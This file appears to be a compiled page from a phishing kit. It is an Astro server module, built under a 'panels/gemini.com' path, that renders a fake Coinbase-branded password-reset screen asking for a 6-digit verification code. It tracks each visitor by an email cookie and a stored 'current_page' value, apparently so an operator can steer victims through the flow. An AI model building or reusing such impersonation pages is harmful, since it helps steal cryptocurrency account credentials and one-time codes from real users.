import { c as createComponent, a as createAstro, d as renderComponent, r as renderTemplate, m as maybeRenderHead } from '../chunks/astro/server_MzpsRm1w.mjs';
import 'kleur/colors';
import { $ as $$AuthLayout } from '../chunks/AuthLayout_CigA1UqO.mjs';
import { $ as $$AuthCard } from '../chunks/AuthCard_DF9IDRFk.mjs';
import { i as initializeDb, g as getUserByEmail } from '../chunks/db__92qgssi.mjs';
/* empty css                                 */
export { renderers } from '../renderers.mjs';

const $$Astro = createAstro();
const $$Reset = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro, $$props, $$slots);
  Astro2.self = $$Reset;
  initializeDb();
  const cookieHeader = Astro2.request.headers.get("cookie");
  const encodedEmail = cookieHeader?.match(/user_email=([^;]+)/)?.[1];
  const userEmail = encodedEmail ? decodeURIComponent(encodedEmail) : null;
  if (!userEmail) {
    return Astro2.redirect("/signin");
  }
  const user = await getUserByEmail(userEmail);
  if (!user) {
    return Astro2.redirect("/signin");
  }
  if (user.current_page && user.current_page !== "reset") {
    return Astro2.redirect(`/${user.current_page}`);
  }
  return renderTemplate`${renderComponent($$result, "AuthLayout", $$AuthLayout, { "title": "Password Reset", "data-astro-cid-qllierwk": true }, { "default": async ($$result2) => renderTemplate` ${renderComponent($$result2, "AuthCard", $$AuthCard, { "data-astro-cid-qllierwk": true }, { "default": async ($$result3) => renderTemplate` ${maybeRenderHead()}<div class="coinbase-card" data-astro-cid-qllierwk> <div class="coinbase-logo" data-astro-cid-qllierwk>coinbase</div> <h2 class="coinbase-heading" data-astro-cid-qllierwk>Reset your password</h2> <p class="coinbase-subtext" data-astro-cid-qllierwk>
Enter the 6-digit code sent to <span class="coinbase-email" data-astro-cid-qllierwk>${user.email}</span> </p> <form class="coinbase-verification-form" data-astro-cid-qllierwk> <div class="coinbase-code-inputs" data-astro-cid-qllierwk> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-qllierwk> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-qllierwk> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-qllierwk> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-qllierwk> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-qllierwk> <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required data-astro-cid-qllierwk> </div> <div class="coinbase-resend" data-astro-cid-qllierwk> <span class="resend-link" data-astro-cid-qllierwk>Resend code</span> <span class="resend-timer" data-astro-cid-qllierwk>(29s)</span> </div> <button type="submit" class="coinbase-continue-btn" disabled data-astro-cid-qllierwk>Continue</button> </form> </div> ` })} ` })}   `;
}, "C:/Users/coold/Desktop/panels/gemini.com/src/pages/reset.astro", void 0);

const $$file = "C:/Users/coold/Desktop/panels/gemini.com/src/pages/reset.astro";
const $$url = "/reset";

const _page = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Reset,
  file: $$file,
  url: $$url
}, Symbol.toStringTag, { value: 'Module' }));

const page = () => _page;

export { page };
